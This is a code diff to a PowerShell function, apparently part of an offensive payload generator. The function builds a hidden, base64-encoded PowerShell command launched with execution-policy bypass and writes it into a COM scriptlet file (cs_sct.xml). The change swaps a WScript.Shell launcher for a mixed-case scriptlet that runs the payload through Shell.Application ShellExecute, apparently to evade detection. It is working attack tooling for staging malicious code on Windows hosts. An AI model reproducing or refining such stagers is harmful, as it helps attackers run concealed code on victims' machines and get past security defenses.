@@ -98,19 +98,9 @@ function cs_sct
     $payloadraw = 'powershell -exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
     $payload = $payloadraw -replace "`n", ""
     $payloadparams = $payload -replace "powershell.exe ",""
-    $snippet2 = '<?XML version="1.0"?>
-<scriptlet>
-
-<registration 
-    progid="Y"
-    classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
-</registration>
-
-<script language="JScript">
-var r = new ActiveXObject("WScript.Shell").Run("'+$payload+'",0);	
-</script>
-
-</scriptlet>'
+    $snippet2 = '<sCrIptlEt><scRIPt>
+a=new ActiveXObject("Shell.Application").ShellExecute("powershell.exe","'+$payloadparams+'","","open","0");
+</scRIPt></sCrIptlEt>'
 
     $CSSCTFile = "$global:newdir\payloads\cs_sct.xml"
     Out-File -InputObject $snippet2 -Encoding ascii -FilePath $CSSCTFile
